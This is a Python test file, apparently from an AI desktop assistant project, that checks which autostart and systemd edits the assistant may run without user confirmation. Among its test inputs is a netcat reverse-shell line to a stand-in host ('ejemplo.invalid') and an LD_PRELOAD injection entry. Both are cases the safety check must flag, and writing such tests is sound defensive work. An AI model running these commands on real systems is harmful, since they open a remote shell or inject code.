# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Lina contributors
"""A16: lo reversible e inocuo va sin «sí» (decidido por el efecto: solo escribe archivos de claves de tu carpeta, sin ninguna clave Exec/TryExec/
Environment, y se puede deshacer; nunca tras leer contenido de fuera); un «sí» solo cubre lo que se describió; no se pide un «sí» para borrar nada;
el aviso dentro de la petición no se espera a sí mismo; más líneas en el registro. Sin código para ninguna acción concreta: los ejemplos son de otras
apps y otros ajustes, y nada toca tu sistema (carpeta personal de la prueba)."""
import os
import sys
from unittest.mock import MagicMock

import pytest

from lina.nucleo import efectos as EF
from lina.nucleo import herramientas as H

OCULTAR = """mkdir -p ~/.config/autostart
cat << 'EOF' > ~/.config/autostart/discord.desktop
[Desktop Entry]
Hidden=true
EOF
systemctl --user daemon-reload"""


# ---------------------------------------------------------------- qué hace ejecutar algo
@pytest.mark.parametrize("contenido, ejecuta", [
    ("[Desktop Entry]\nHidden=true\n", False),
    ("[Desktop Entry]\nName[es]=Telegram\nX-GNOME-Autostart-enabled=false\n", False),
    ("[Unit]\nDescription=otra\n", False),
    ("[Desktop Entry]\nExec=telegram-desktop -startintray\n", True),
    ("[Desktop Entry]\nTryExec=steam\nHidden=true\n", True),
    ("[Service]\nExecStart=/usr/bin/sync\n", True),
    ("[Service]\nExecStartPre=/bin/true\n", True),
    ("[Service]\nEnvironment=LD_PRELOAD=/tmp/x.so\n", True),
    ("alias ls='ls --color'\n", True),                         # un perfil de la shell: todo se interpreta como órdenes
    ("PATH=/tmp/x:$PATH\n", True),                             # claves sin grupo (environment.d, perfiles): no cuentan como de claves
    ('{"autostart": false}\n', True),                          # otro formato: se confirma
])
def test_hace_ejecutar_por_el_formato_y_las_claves(contenido, ejecuta):
    assert EF.hace_ejecutar(contenido) is ejecuta


# ---------------------------------------------------------------- reversible e inocuo
@pytest.fixture
def casa(tmp_path):
    (tmp_path / ".config" / "autostart").mkdir(parents=True)
    return str(tmp_path)


@pytest.mark.parametrize("orden", [
    OCULTAR,
    "echo '[Desktop Entry]' > ~/.config/autostart/steam.desktop && echo 'Hidden=true' >> ~/.config/autostart/steam.desktop",
    "kwriteconfig6 --file ~/.config/autostart/telegram.desktop --group 'Desktop Entry' --key Hidden true",
    "mkdir -p ~/.config/systemd/user/sincronizar.service.d && printf '[Unit]\\nDescription=sin cambios\\n' > ~/.config/systemd/user/sincronizar.service.d/x.conf",
])
def test_lo_que_solo_oculta_o_desactiva_es_reversible_e_inocuo(casa, orden):
    assert EF.reversible_e_inocuo(orden, casa) == (True, "")


@pytest.mark.parametrize("orden, motivo", [
    (OCULTAR.replace("Hidden=true", "Exec=nc -e /bin/sh ejemplo.invalid 9"), "ejecute"),
    (OCULTAR.replace("Hidden=true", "TryExec=x"), "ejecute"),
    ("echo 'source ~/x.sh' >> ~/.bashrc", "ejecute"),
    ("cp /etc/xdg/autostart/x.desktop ~/.config/autostart/", "contenido"),
    ("sed -i 's/Hidden=false/Hidden=true/' ~/.config/autostart/x.desktop", "contenido"),
    ("echo $(cat x) > ~/.config/autostart/x.desktop", "contenido"),
    ("sudo tee /etc/xdg/autostart/x.desktop <<EOF\n[Desktop Entry]\nHidden=true\nEOF", "administrador"),
    ("echo '[Desktop Entry]' > /tmp/fuera/x.desktop", "fuera de tu carpeta"),
    (OCULTAR + "\nrm ~/.config/autostart/otro.desktop", "algo más"),
])
def test_lo_demas_se_sigue_confirmando(casa, orden, motivo):
    ok, por_que = EF.reversible_e_inocuo(orden, casa)
    assert not ok and motivo in por_que


def test_sobrescribir_sin_copia_para_deshacer_se_confirma(casa):
    destino = os.path.join(casa, ".config", "autostart", "discord.desktop")
    open(destino, "w").write("[Desktop Entry]\nExec=discord\n")
    assert not EF.reversible_e_inocuo(OCULTAR, casa)[0]
    assert EF.reversible_e_inocuo(OCULTAR, casa, se_puede_deshacer=lambda r: r == destino) == (True, "")


def test_anadir_a_un_archivo_de_claves_juzga_lo_anadido(casa):
    destino = os.path.join(casa, ".config", "autostart", "steam.desktop")
    open(destino, "w").write("[Desktop Entry]\nExec=steam -silent\n")
    puede = {"se_puede_deshacer": lambda r: True}
    assert EF.reversible_e_inocuo("echo 'Hidden=true' >> ~/.config/autostart/steam.desktop", casa, **puede)[0]
    assert not EF.reversible_e_inocuo("echo 'Exec=otra' >> ~/.config/autostart/steam.desktop", casa, **puede)[0]


# ---------------------------------------------------------------- en el ejecutor
@pytest.fixture
def ej(monkeypatch):
    e = H.Ejecutor(avisar=MagicMock(), confirmar=True)
    e.ejecutados = []
    monkeypatch.setattr(e, "_con_red", lambda comando, motivo, clase: e.ejecutados.append((comando, clase)) or "código de salida: 0 (0 s)\nhecho")
    monkeypatch.setattr(H, "notificar", lambda *a, **k: None)
    os.makedirs(os.path.join(H._HOME, ".config", "autostart"), exist_ok=True)
    return e


def test_ocultar_otra_app_del_arranque_va_sin_si(ej):
    r = ej.herramienta({"comando": OCULTAR, "motivo": "que Discord no arranque solo"})
    assert not r.startswith("PREPARADO") and ej.ejecutados == [(OCULTAR, "autonomo")] and not ej.pendientes


def test_con_una_orden_exec_sigue_pidiendo_si(ej):
    orden = OCULTAR.replace("Hidden=true", "Exec=telegram-desktop")
    assert ej.herramienta({"comando": orden, "motivo": "x"}).startswith("PREPARADO") and not ej.ejecutados


def test_tras_leer_contenido_de_fuera_se_confirma_como_siempre(ej):
    ej.contaminar("página web")
    assert ej.herramienta({"comando": OCULTAR, "motivo": "x"}).startswith("PREPARADO") and not ej.ejecutados


def test_no_pide_un_si_para_borrar_nada(ej):
    r = ej.herramienta({"comando": "rm -f ~/.config/autostart/telegram*.desktop ~/.config/autostart/*org.telegram*", "motivo": "x"})
    assert r.startswith("No existe nada que coincida") and "mira primero" in r and not ej.pendientes and not ej.ejecutados
    from lina.nucleo import turnos as TU
    assert TU.motivo_corto(r).startswith("No existe nada que coincida con ~/.config/autostart/telegram*.desktop")    # lo que se diría si no se hizo nada


def test_un_si_para_borrar_no_cubre_escribir(ej):
    existe = os.path.join(H._HOME, ".config", "autostart", "steam.desktop")
    open(existe, "w").write("[Desktop Entry]\nExec=steam\n")
    assert ej.herramienta({"comando": "rm -f ~/.config/autostart/steam.desktop", "motivo": "quitar Steam del arranque"}).startswith("PREPARADO")
    ej.confirmar_pendientes()
    assert ej.permiso and ej.permiso["efectos"] == {"borrar"}
    orden = OCULTAR.replace("discord", "steam").replace("Hidden=true", "Exec=steam -silent")
    assert ej.herramienta({"comando": orden, "motivo": "x"}).startswith("PREPARADO")


@pytest.mark.parametrize("comando, efecto", [
    (OCULTAR, {"escribir", "servicio"}), ("gio trash -- ~/x", {"borrar"}), ("sudo paru -S x", {"instalar"}),
    ("systemctl --user disable --now sincronizar.service", {"servicio"}), ("ls ~/.config/autostart", set()),
])
def test_el_efecto_de_cada_orden(comando, efecto):
    assert EF.efectos(comando) == efecto


# ---------------------------------------------------------------- la duda, el registro y la receta
def test_un_fallo_porque_no_existia_nada_no_deja_duda():
    assert H._no_existia_nada("código de salida: 1 (0 s)\ngio: file:///h/x: Error trashing file /h/x: No such file or directory")
    assert not H._no_existia_nada("código de salida: 1 (0 s)\ngio: Error trashing file: Permission denied")


def test_la_ultima_orden_que_solo_mira():
    assert H._ultimo_tramo_mira(OCULTAR + "\nsystemctl --user list-unit-files | grep -i discord")
    assert not H._ultimo_tramo_mira("ls ~; rm x")


def test_el_registro_guarda_doce_lineas_y_en_privado_una(ej, monkeypatch):
    vistos = []
    monkeypatch.setattr(H, "log", vistos.append)
    monkeypatch.setattr(H, "anotar", lambda m: None)
    salida = "\n".join(f"linea {i}" for i in range(20))
    ej._resultado(0, salida, 0.1, "ls")
    assert "linea 11" in vistos[-1] and "linea 12" not in vistos[-1] and "8 líneas más" in vistos[-1]
    ej.en_privado = lambda: True
    ej._resultado(0, salida, 0.1, "ls")
    assert "linea 0" in vistos[-1] and "linea 1\n" not in vistos[-1] and "linea 1 " not in vistos[-1]


def test_las_acciones_de_varias_lineas_quedan_en_una(tmp_path, monkeypatch):
    from lina.nucleo import registro as REG
    monkeypatch.setattr(REG, "ARCHIVO_ACCIONES", tmp_path / "acciones.log")
    REG.anotar(f"[autonomo] {OCULTAR}")
    texto = (tmp_path / "acciones.log").read_text(encoding="utf-8")
    assert texto.count("\n") == 1 and "Hidden=true ⏎ EOF" in texto


# ---------------------------------------------------------------- con ia.aislar: solo se abre donde escribe lo juzgado
def test_la_jaula_abre_solo_la_ruta_de_lo_reversible():
    from lina.nucleo import aislamiento as AIS
    casa = "/casa/prueba"
    arranque = os.path.join(casa, ".config/autostart")
    cerrada = AIS.orden(["true"], AIS.Jaula(casa=casa), existe=lambda r: True)
    abierta = AIS.orden(["true"], AIS.Jaula(casa=casa, abiertas=[arranque]), existe=lambda r: True)
    assert ["--ro-bind", arranque, arranque] == cerrada[cerrada.index(arranque) - 1:cerrada.index(arranque) + 2]
    assert arranque not in abierta and os.path.join(casa, ".bashrc") in abierta       # lo demás de solo lectura sigue igual


def test_el_ejecutor_abre_la_ruta_solo_para_esa_orden(ej, monkeypatch):
    monkeypatch.setattr(H, "modo_aislar", lambda: "auto")
    monkeypatch.setattr(H.AIS, "disponible", lambda: (True, ""))
    ej.herramienta({"comando": OCULTAR, "motivo": "x"})
    arranque = os.path.join(H._HOME, ".config/autostart")
    assert ej._jaula(OCULTAR, OCULTAR, "autonomo").abiertas == [arranque]
    otra = "echo hola > ~/.config/autostart/otra.desktop"
    assert ej._jaula(otra, otra, "autonomo").abiertas == []
